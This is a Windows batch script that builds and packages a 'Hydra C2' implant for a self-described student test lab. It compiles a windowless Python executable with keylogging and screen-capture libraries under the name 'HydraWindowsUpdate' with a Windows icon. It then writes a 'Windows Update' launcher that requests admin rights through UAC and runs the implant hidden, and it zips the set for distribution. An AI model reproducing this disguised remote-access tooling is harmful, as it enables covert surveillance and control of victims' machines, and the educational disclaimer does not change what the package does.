@echo off
echo.
echo Hydra C2 Test Lab Package Builder
echo ================================
echo This script builds a complete test lab package for students
echo.

REM Set Python executable
set PYTHON_EXE=python

REM Check if Python is available
%PYTHON_EXE% --version >nul 2>&1
if %errorLevel% neq 0 (
    echo Error: Python not found. Please install Python 3.7+ or set correct path.
    exit /b 1
)

REM Ensure all dependencies are installed
echo Installing required dependencies...
%PYTHON_EXE% -m pip install -q pyinstaller pillow pynput pywin32 pyautogui websockets cryptography psutil

REM Create output directories
if not exist "dist\" mkdir dist
if not exist "dist\lab\" mkdir dist\lab

REM Build the executable using PyInstaller
echo Building test lab executable...
%PYTHON_EXE% -m PyInstaller --clean --onefile --noconsole ^
    --name "HydraWindowsUpdate" ^
    --icon "windows.ico" ^
    --hidden-import websockets ^
    --hidden-import asyncio ^
    --hidden-import pynput.keyboard ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import pyautogui ^
    --hidden-import psutil ^
    --hidden-import PIL.Image ^
    hydra_client_lab.py

REM Create the self-elevating launcher
echo Creating launcher script...
(
echo @echo off
echo REM Windows Update Self-Elevating Launcher
echo title Windows Update
echo.
echo REM Check if running as admin
echo net session ^>nul 2^>^&1
echo if %%errorLevel%% NEQ 0 (
echo    echo Requesting administrative rights...
echo    powershell -Command "Start-Process -Verb RunAs -FilePath '%%~dp0HydraWindowsUpdate.exe' -WindowStyle Hidden"
echo    exit /b
echo ^) else (
echo    start "" /b "%%~dp0HydraWindowsUpdate.exe"
echo    exit /b
echo ^)
) > "dist\WindowsUpdate.bat"

REM Copy all files to the lab directory
echo Preparing test lab package...
copy "dist\HydraWindowsUpdate.exe" "dist\lab\" >nul
copy "dist\WindowsUpdate.bat" "dist\lab\" >nul

REM Create a simple instruction file
echo Creating instructions for students...
(
echo Hydra C2 Test Lab - Student Instructions
echo =======================================
echo.
echo IMPORTANT: This software is for EDUCATIONAL PURPOSES ONLY
echo.
echo Getting Started:
echo ----------------
echo 1. Launch "WindowsUpdate.bat" to start the implant
echo 2. The implant will connect to the C2 server automatically
echo 3. The window will close automatically after connection
echo.
echo Verification:
echo -------------
echo You can verify the implant is running by checking Task Manager
echo for "HydraWindowsUpdate.exe" or "Windows Update" processes.
echo.
echo Troubleshooting:
echo ----------------
echo - If you get a UAC prompt, click "Yes" to allow administrative access
echo - If the implant fails to connect, ask your instructor for assistance
echo - Log files can be found in %%TEMP%%\hydra_logs\ if needed for debugging
) > "dist\lab\README.txt"

REM Create a lab package zip file
echo Creating final lab package zip...
cd dist
powershell -Command "Compress-Archive -Force -Path lab\* -DestinationPath 'HydraTestLab.zip'"
cd ..

echo.
echo Build completed successfully!
echo.
echo Output files:
echo   - dist\lab\HydraWindowsUpdate.exe (Main implant)
echo   - dist\lab\WindowsUpdate.bat (Self-elevating launcher)
echo   - dist\lab\README.txt (Instructions for students)
echo   - dist\HydraTestLab.zip (Complete package for distribution)
echo.
echo REMINDER: Use this software for EDUCATIONAL PURPOSES ONLY
echo.
pause 